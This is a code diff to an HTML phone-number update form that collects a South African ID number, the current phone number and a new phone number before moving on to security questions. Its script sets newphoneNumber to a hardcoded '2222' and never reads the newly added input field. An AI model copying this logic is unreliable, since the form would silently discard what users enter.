@@ -61,7 +61,8 @@
 
     <!-- Paragraph message -->
     <p class="note">
-      ⚠ Fixing: No card record found, or ID and phone number do not match.
+When updating your phone number, it’s important to ensure the process is secure. You’ll be asked to provide your ID number and current phone details before proceeding. Once verified, you can enter your new phone number. For added protection, security questions help confirm your identity and prevent unauthorized changes.
+      
     </p>
 
     <!-- ID number -->
@@ -86,8 +87,17 @@
       placeholder="e.g. 0821234567"
       required
     />
+<label for="newphoneNumber">New Phone Number</label> 
+    <input
+      id="newphoneNumber" 
+      name="newphoneNumber" 
+      type="tel"
+      inputmode="tel"
+      placeholder="e.g. 0821234567"
+      required
+    /> 
 
-    <button id="submitButton" type="submit">Submit</button>
+    <button id="submitButton" type="submit">Proceed to security questions</button> 
   </form>
 
   <script>
@@ -133,7 +143,7 @@
 
       const idNumber = document.getElementById("idNumber").value.trim();
       const phoneNumber = document.getElementById("phoneNumber").value.trim();
-      const newphoneNumber = "1111";
+      const newphoneNumber = "2222"; 
 
       if (!isValidSAID(idNumber)) {
         alert("Invalid South African ID number.");
@@ -162,3 +172,8 @@
   </script>
 </body>
 </html>
+
+
+
+
+
